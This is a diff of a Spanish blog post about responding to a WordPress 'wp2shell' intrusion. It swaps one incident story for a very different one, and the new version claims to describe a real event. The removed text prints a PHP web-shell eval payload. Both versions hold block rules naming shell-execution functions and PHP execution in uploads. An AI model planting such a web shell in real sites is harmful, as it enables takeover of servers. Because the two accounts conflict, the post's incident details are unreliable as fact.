@@ -1,117 +1,150 @@
 ---
-title: "WP2Shell en Producción: Crónica de un Parche a Contrarreloj, Dos Sitios en Blanco y el Rescate de los Backups"
-date: "2026-09-22"
+title: "La página en blanco que era un ataque: wp2shell, administradores fantasma y la pista falsa de PHP 8.3"
+date: "2026-09-08"
 category: "Incident Response"
-excerpt: "Llegó como la típica alerta casual de 'hay una nueva actualización disponible', pero detrás venía un intento masivo de RCE. Crónica de una carrera contra reloj, cómo la defensa en profundidad frenó la intrusión y por qué los backups matutinos salvaron la jornada."
-coverImage: "/blog-posts/images/cve-2026-9860.png"
-coverAlt: "Auditoría de seguridad y análisis de logs durante el incidente WP2Shell"
+excerpt: "Llegó como un reporte de bug rutinario: una página en blanco devolviendo HTTP 200 con 0 bytes. Al tirar del hilo descubrimos una campaña masiva de wp2shell, 11 administradores fantasma plantados semanas atrás, backdoors camuflados como imágenes y un error de PHP 8.3 que casi nos desvía del diagnóstico real."
+coverImage: "/blog-posts/images/wp2shell-cover.jpg"
+coverAlt: "Análisis forense de ciberseguridad y auditoría de WordPress en producción"
 ---
 
-Hay alertas de seguridad que llegan con aviso previo y se programan en ventanas de mantenimiento tranquilas. Y luego están las que llegan un martes cualquiera, disfrazadas de notificación rutinaria, para poner a prueba cada capa de tu infraestructura.
-
-Eso fue exactamente lo que vivimos con el vector bautizado en la comunidad como **WP2Shell**: un intento crítico de ejecución remota de comandos (*RCE*) que nos agarró completamente desprevenidos, nos obligó a una carrera contrarreloj en producción y nos dejó una lección imborrable sobre defensa en profundidad.
-
----
-
-## 1. "Una actualización rutinaria más": La calma antes de la tormenta
-
-- **Fecha:** Martes, 22 de Septiembre de 2026
-- **Hora inicial de detección:** 10:45 AM UTC-5
-- **Severidad:** Crítica (CVSS 9.8 - Remote Code Execution / Unauthenticated Arbitrary File Upload)
-- **Alcance inicial:** Múltiples entornos WordPress gestionados en servidores dedicados y contenedores aislados.
-
-La mañana transcurría con normalidad cuando saltó la notificación en nuestro canal de seguridad: la típica alerta automática informando de un parche de seguridad de emergencia con la indicación estándar: *"Hay una nueva versión disponible, se recomienda actualizar a la brevedad"*.
-
-Al principio parecía el habitual ciclo de parches menores. Sin embargo, al abrir el advisory técnico y analizar el diff del commit, la realidad nos golpeó de frente: no era una corrección cosmética ni un bug menor de sanitización en el panel de administración. Era una vulnerabilidad que permitía saltarse los filtros de autenticación y cargar código ejecutable directamente hacia el filesystem del servidor web. La llamaban informalmente **WP2Shell**.
-
-En cuestión de minutos comenzaron a aparecer reportes en foros de SRE y ciberseguridad: bots automatizados ya estaban barriendo bloques enteros de IPs buscando sitios sin parchear para inyectar *web shells* persistentes.
+> [!WARNING] **Nota de confidencialidad y contexto:**  
+> *Los nombres de organizaciones, proyectos, identificadores de red y credenciales han sido anonimizados por motivos de seguridad y confidencialidad operativa. La arquitectura técnica, la cronología de eventos, los comandos ejecutados, los diagnósticos y las lecciones aprendidas corresponden a un incidente real vivido en producción.*
 
 ---
 
-## 2. La carrera contra reloj
+En soporte de producción hay problemas que entran disfrazados de inconvenientes menores de frontend. Un lunes por la mañana recibimos un ticket reportando que el portal público de una institución gremial educativa —a la que llamaremos **Proyecto Arquia**— no cargaba.
 
-No teníamos una ventana de mantenimiento programada para ese día. Actualizar en caliente decenas de sitios en producción siempre implica riesgos: incompatibilidad con plugins heredados, hooks de caché desalineados o caídas de base de datos. Pero con un exploit activo circulando en la red, **el riesgo de esperar era infinitamente mayor que el de actuar**.
+Al abrir la URL en el navegador nos encontramos con el escenario más desconcertante de la web: una **pantalla totalmente en blanco**. Ni error 500, ni pantalla de mantenimiento, ni advertencias de base de datos. Una respuesta limpia de `HTTP 200 OK` con un cuerpo exacto de `0 bytes`.
 
-Iniciamos de inmediato el protocolo de emergencia on-call:
+Lo que en un primer momento parecía un problema de caché o una plantilla desconfigurada tras una actualización, terminó siendo la fase final de una intrusión masiva a nivel global explotando la vulnerabilidad **wp2shell**. Los atacantes llevaban más de un mes dentro del sistema, habían sembrado 11 cuentas de administrador no autorizadas y estaban a punto de tomar control total del servidor.
 
-1. **Priorización de activos:** Identificar qué sitios contaban con tráfico crítico y cuáles estaban más expuestos a internet público.
-2. **Despliegue automatizado vía WP-CLI y SSH:** En lugar de entrar al wp-admin de cada instalación, disparamos scripts de actualización masiva por lotes para descargar y aplicar el core parcheado directamente en el filesystem:
-   ```bash
-   # Verificación y actualización forzada vía WP-CLI en lote
-   wp core update --version=latest --allow-root
-   wp core verify-checksums --allow-root
-   ```
-3. **Bloqueo temporal en el Edge Ingress (NGINX / WAF):** Añadimos reglas de filtrado de emergencia para denegar peticiones `POST` sospechosas hacia endpoints de uploads y bloquear extensiones `.phtml`, `.php5` o binarios en directorios estáticos:
-   ```nginx
-   # Bloqueo estricto de ejecución en uploads
-   location ~* ^/wp-content/uploads/.*\.php$ {
-       deny all;
-       return 403;
-   }
-   ```
-
-Estuvimos durante más de tres horas trabajando bajo presión constante, monitoreando el consumo de CPU de los servidores, asegurando que los workers de PHP-FPM no se saturaran y verificando que cada actualización concluyera con éxito.
+Esta es la autopsia técnica de la investigación, el laberinto de la pista falsa que casi nos hace perder el rumbo y cómo la remediamos de raíz.
 
 ---
 
-## 3. El impacto: Dos sitios alcanzados
+## 1. La anatomía del ataque: cómo ocurrió la brecha silenciosa
 
-Alrededor de las 14:10, justo cuando estábamos terminando de desplegar el parche en los últimos entornos, empezamos a notar los primeros efectos de la ola de ataques globales.
+Para entender por qué el sitio quedó en blanco, tuvimos que reconstruir la cronología forense cruzando los commits del repositorio Git, los registros de auditoría de la plataforma cloud (Pantheon) y la base de datos de producción:
 
-En dos sitios particulares, las sondas de monitoreo sintético y de salud arrojaron de pronto una caída de disponibilidad: el temido **White Screen of Death (WSOD)** o página en blanco con código HTTP 500.
-
-El atacante había logrado alcanzar esos dos sitios escasos minutos antes de que nuestro script de actualización procesara esas instancias específicas.
-
-### ¿Qué intentó hacer el atacante?
-Al inspeccionar de urgencia los logs de acceso de NGINX y los archivos modificados recientemente (`find /var/www -type f -mmin -30`), encontramos las huellas del payload:
-```text
-POST /wp-includes/.../upload-handler.php HTTP/1.1 200
-Payload: <?php @eval(gzuncompress(base64_decode($_POST['payload']))); ?>
+```timeline
+cronologia-ataque-wp2shell
 ```
 
-El script malicioso intentaba escribir un archivo camuflado dentro de la estructura de archivos para establecer una conexión de retorno (*reverse shell*) y tomar control del servidor.
+### El vector: wp2shell
+A mediados de julio se hizo pública una de las vulnerabilidades más destructivas del ecosistema WordPress: una combinación de **confusión de rutas en la REST API** encadenada con una **inyección SQL sin autenticación**. El resultado era ejecución remota de código (RCE) directa.
 
-### Por qué el ataque fracasó: Defensa en Profundidad
-Aquí fue donde las decisiones de arquitectura preventiva que habíamos tomado meses atrás demostraron su verdadero valor. A pesar de que el exploit aprovechó la vulnerabilidad, **el atacante no pudo ejecutar su shell**:
+Los atacantes actuaron en cuestión de horas. A través de bots automatizados, atacaron la API e insertaron directamente en la tabla `wp_users` una serie de cuentas con privilegios de administrador:
 
-1. **Permisos estrictos de solo lectura (`chmod 444` / montajes `read-only`):** Los directorios del núcleo de WordPress estaban protegidos contra escritura por el usuario `www-data`.
-2. **Desactivación de ejecución en PHP (`disable_functions`):** En la configuración de `php.ini`, funciones como `exec`, `shell_exec`, `system`, `passthru` y `proc_open` estaban completamente deshabilitadas a nivel de runtime.
-3. **Restricción `DISALLOW_FILE_EDIT` y `DISALLOW_FILE_MODS`:** Imposibilitaban la alteración de archivos PHP desde el panel web.
+![Auditoría de usuarios administradores en WP-CLI mostrando cuentas maliciosas](/blog-posts/images/terminal-wp-admins.svg "Auditoría en Pantheon: detección de 11 cuentas de administrador fantasma con dominios .invalid creadas semanas antes")
 
-Al no poder invocar los comandos del sistema operativo ni escribir en las rutas protegidas, el script del atacante provocó un error fatal de PHP por violación de permisos y funciones no disponibles. **Lo único que lograron fue romper la ejecución del hilo de PHP, dejando la pantalla en blanco.** No hubo fuga de datos, no hubo elevación de privilegios ni infección de la base de datos.
+### La falsa sensación de tranquilidad del parche automático
+Cuatro días después de la intrusión, el sistema de actualización automática de dependencias (*Autopilot*) se ejecutó según su cron semanal, actualizó el núcleo de WordPress a la versión `7.0.2` corregida y se dio por cerrado el aviso de seguridad en los tableros internos.
 
----
-
-## 4. La recuperación: El poder de los backups matutinos
-
-Tener dos sitios caídos sigue siendo un incidente P1, pero la resolución fue sorprendentemente rápida y limpia gracias a una política innegociable de nuestro equipo: **copias de seguridad automatizadas diarias a primera hora de la mañana**.
-
-Ese mismo día a las 06:00 AM, el cronjob de snapshots había generado un respaldo íntegro (base de datos + archivos) almacenado en almacenamiento seguro fuera del servidor.
-
-El procedimiento de rescate tomó menos de 15 minutos:
-
-1. **Aislamiento de las instancias:** Detuvimos temporalmente el tráfico público hacia esos dos contenedores para evitar interferencias.
-2. **Restauración desde el snapshot limpio de la mañana:**
-   ```bash
-   # Revertir filesystem al estado limpio de las 06:00 AM
-   tar -xzf /backups/2026-09-22-0600-site1.tar.gz -C /var/www/site1/
-   ```
-3. **Aplicación inmediata del parche de WordPress:** Con el sitio ya restaurado en limpio, ejecutamos inmediatamente la versión actualizada de WordPress antes de reabrir el tráfico:
-   ```bash
-   wp core update --version=latest --allow-root
-   wp core verify-checksums --allow-root
-   ```
-4. **Verificación de integridad:** Auditamos los hashes del core con `wp core verify-checksums`, comprobamos la ausencia de tablas huérfanas en MariaDB y relanzamos las pruebas funcionales.
-5. **Reanudación del servicio:** A las 14:35, ambos sitios estaban 100% operativos, completamente limpios y protegidos.
+Aquí estuvo el primer fallo operativo: **cerrar la vulnerabilidad no expulsó a los atacantes**. Las 11 cuentas de administrador ya estaban registradas y activas en la base de datos. La puerta trasera estaba abierta por dentro.
 
 ---
 
-## 5. Lecciones aprendidas y mejoras implementadas
+## 2. La pista falsa: cuando un bug normal se esconde en el incidente
 
-Este incidente dejó reflexiones muy claras para nuestra estrategia de SRE y seguridad:
+Cuando intenté acceder al panel de administración `/wp-admin/` con mi usuario legítimo para inspeccionar los plugins, la pantalla arrojó el temido mensaje:  
+*«Ha habido un error crítico en esta web»*.
 
-* **Las alertas nunca son "casuales":** En el ecosistema web moderno, la ventana de tiempo entre la publicación de un CVE crítico y los escaneos automatizados masivos se cuenta en minutos, no en días.
-* **La defensa en profundidad no es un cliché:** Si hubiéramos confiado únicamente en que "el software no tuviera bugs", el atacante habría obtenido una shell en el servidor. Fueron las capas de contención (permisos de filesystem, deshabilitación de funciones peligrosas en PHP y reglas NGINX) las que neutralizaron el daño y lo redujeron a un simple error 500.
-* **Los backups verificados son tu póliza de vida:** No basta con programar backups; deben ejecutarse con alta frecuencia y su proceso de restauración debe estar automatizado y probado previamente. Restaurar dos sitios en 15 minutos solo fue posible porque sabíamos exactamente qué comandos ejecutar sin titubear.
+La reacción instintiva en medio de un incidente de seguridad es asumir que **todo** lo que falla es obra del atacante. Pensamos inmediatamente: *«bloquearon el acceso a los administradores legítimos»*.
 
-Un día difícil, mucho café y trabajo bajo reloj, pero con la satisfacción de ver que los sistemas preventivos funcionaron exactamente como debían.
+Al revisar los logs de error de PHP en el servidor:
+
+```text
+Fatal error: Uncaught TypeError: gmdate(): Argument #2 ($timestamp) must be of type ?int, string given 
+in /code/web/wp-content/plugins/bb-ultimate-addon/classes/class-uabb-cloud-templates.php:148
+```
+
+Era un simple error tipado de **PHP 8.3**. Una opción en la base de datos (`uabb_cloud_templates`) contenía un string vacío en lugar de un entero, provocando que `gmdate()` rompiera la ejecución en cada carga del admin.
+
+No tenía nada que ver con el ataque: era un bug de compatibilidad latente de un plugin de maquetación que coincidió con el momento crítico. Corregirlo fue tan simple como ejecutar:
+
+```bash
+terminus wp arquia-portal.live -- option delete uabb_cloud_templates
+```
+
+Con esa sola línea el acceso a `/wp-admin/` volvió. Si hubiéramos perdido horas teorizando sobre un supuesto bloqueo malicioso en el código de autenticación, habríamos retrasado la respuesta real. En incidentes graves, aislar el ruido es el 50% del éxito.
+
+---
+
+## 3. La causa real de la página en blanco: bisección de backups
+
+¿Por qué el sitio público entregaba 0 bytes?
+
+Audité el historial de Git del repositorio y confirmamos que no había habido ningún despliegue de código en las últimas dos semanas. El código en disco estaba intacto. Por lo tanto, **el daño estaba en la base de datos**.
+
+Utilizando los backups diarios de la base de datos en Pantheon, realizamos una **bisección retrospectiva**:
+- Backup del 21 de agosto: el sitio renderizaba correctamente.
+- Backup del 27 de agosto: el sitio devolvía 0 bytes.
+
+Al comparar el diff de la tabla `wp_options` entre ambos volcados, el misterio se resolvió:
+
+```sql
+-- Valores legítimos (21 de agosto):
+template = 'bb-theme'
+stylesheet = 'bb-theme-child'
+current_theme = 'Arquia Custom Theme'
+
+-- Valores tras el ataque (27 de agosto):
+template = ''
+stylesheet = ''
+current_theme = ''
+```
+
+El 25 de agosto, los atacantes utilizaron uno de los administradores fantasma para iniciar sesión desde una IP de Azure (`52.190.192.x`). Durante una ventana de 70 minutos ejecutaron un escaneo automático intentando subir plugins, editar temas y modificar archivos. Al encontrarse con que el sistema de archivos de Pantheon en producción es de **solo lectura** por diseño (lo cual bloqueó la subida de webshells ejecutables), el script del atacante forzó una escritura en la base de datos que vació las opciones del tema activo.
+
+Al no existir tema asignado, el motor de WordPress no tenía qué renderizar: cargaba el core en memoria, devolvía código 200 y finalizaba con un buffer vacío.
+
+---
+
+## 4. Los archivos fantasma: cómo WordPress neutralizó los backdoors
+
+Durante la revisión forense del directorio de medios (`wp-content/uploads/`) descubrimos algo fascinante: 10 archivos sospechosos en las carpetas de julio y agosto con extensiones extrañas:
+
+```text
+wp-content/uploads/2026/07/wp-cache-core.php_.gif
+wp-content/uploads/2026/08/session-cache-db.php_.gif
+```
+
+El atacante intentó subir backdoors PHP camuflados como falsos plugins de caché. Sin embargo, la función interna `sanitize_file_name()` de WordPress detectó la manipulación de nombres y renombró los archivos agregando la extensión `.gif` al final, convirtiéndolos en archivos inertes que NGINX nunca ejecutaría como código PHP.
+
+El atacante creía que sus puertas traseras estaban operativas e intentó llamarlas mediante peticiones automatizadas (selftest pings), pero todas recibieron un error 404. La defensa en profundidad de la plataforma funcionó.
+
+---
+
+## 5. Remediación paso a paso
+
+Una vez confirmado el vector y el alcance, ejecutamos un plan de remediación integral:
+
+1. **Eliminación quirúrgica de administradores fantasma:**  
+   Se eliminaron las 11 cuentas no autorizadas tanto en el entorno `live` como en el de `test` mediante WP-CLI:
+   ```bash
+   terminus wp arquia-portal.live -- user delete 4 5 6 7 8 9 10 11 12 13 14 --reassign=1 --yes
+   ```
+2. **Restauración de opciones de tema:**  
+   Reasignamos el tema padre y tema hijo en la base de datos y limpiamos la caché del Edge:
+   ```bash
+   terminus wp arquia-portal.live -- option update template 'bb-theme'
+   terminus wp arquia-portal.live -- option update stylesheet 'bb-theme-child'
+   terminus env:clear-cache arquia-portal.live
+   ```
+3. **Invalidación total de sesiones:**  
+   Se destruyeron todas las cookies y tokens de sesión existentes para obligar a una reautenticación limpia de usuarios legítimos:
+   ```bash
+   terminus wp arquia-portal.live -- eval 'foreach (get_users() as $u) { WP_Session_Tokens::get_instance($u->ID)->destroy_all(); }'
+   ```
+4. **Purga de archivos neutralizados:** Se eliminaron los 10 archivos `.php_.gif` huérfanos del directorio de subidas.
+5. **Auditoría horizontal a nivel de organización:**  
+   Ese mismo día ejecutamos un script automatizado sobre los **17 sitios web adicionales** de la organización en Pantheon para buscar firmas de wp2shell. Ningún otro sitio tenía administradores comprometidos.
+
+---
+
+## 6. Lecciones que nos dejó este incidente
+
+1. **Un bug de página en blanco no siempre es un fallo de código:** Puede ser el residuo destructivo de un atacante frustrado por no haber podido escribir en disco.
+2. **La bisección de backups es una máquina del tiempo invaluable:** Sin backups diarios retenidos, habría sido imposible determinar la ventana exacta de 6 días en la que se alteró la tabla `wp_options`.
+3. **Las actualizaciones automáticas no bastan si ya hubo intrusión:** Si un parche llega 4 días después del inicio de una campaña masiva de explotación, asumir que el sitio está seguro sin auditar tablas de usuarios es una negligencia operativa.
+4. **No mezcles bugs cotidianos con el incidente:** El `TypeError` en PHP 8.3 parecía un sabotaje deliberado y terminó siendo un fallo menor de formato. Calma, logs y verificación empírica.
